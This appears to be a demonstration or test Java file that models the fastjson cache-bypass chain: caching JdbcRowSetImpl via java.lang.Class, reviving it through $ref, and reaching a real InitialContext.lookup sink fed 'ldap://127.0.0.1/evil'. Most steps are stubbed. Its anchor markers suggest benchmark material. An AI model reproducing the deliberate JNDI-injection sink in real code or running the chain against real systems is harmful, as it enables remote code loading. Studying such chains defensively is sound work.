package blinded;

import javax.naming.InitialContext;
import javax.naming.NamingException;


























public class GmCacheBypass {

    


    public static class ClassRefCacheStub {
        private String dataSourceName;

        
        public void setDataSourceName(String dataSourceName) {
            this.dataSourceName = dataSourceName;
            /*ANCHOR_1*/
            triggerLookup(this.dataSourceName); // 缓存复活后危险 sink 可达 InitialContext.lookup
        }

        
        private void triggerLookup(String name) {
            try {
                InitialContext ctx = new InitialContext();
                Object ref = ctx.lookup(name); // 模拟 sink：真实语义为 InitialContext.lookup(name)
                System.out.println("[demo-only] JNDI lookup via cache: " + name + " -> " + ref);
            } catch (NamingException e) {
                System.out.println("[demo-only] lookup failed (demo only): " + name);
            }
        }
    }

    



    public static void demo() {
        // 步骤①：java.lang.Class 将恶意类写入 TypeUtils 缓存（缓存注入触发点）
        injectIntoCache("com.sun.rowset.JdbcRowSetImpl"); // 经 java.lang.Class 将类载入缓存（trace 节点1）

        // 步骤②：经 $ref 复活缓存条目并驱动 JNDI sink
        ClassRefCacheStub revived = (ClassRefCacheStub) getFromCache("com.sun.rowset.JdbcRowSetImpl");
        revived.setDataSourceName("ldap://127.0.0.1/evil"); // 攻击者控制输入直达 sink
    }

    
    private static void injectIntoCache(String className) {
        System.out.println("[demo-only] caching class via java.lang.Class: " + className);
    }

    
    private static Object getFromCache(String className) {
        System.out.println("[demo-only] $ref revive from cache: " + className);
        return new ClassRefCacheStub();
    }
}
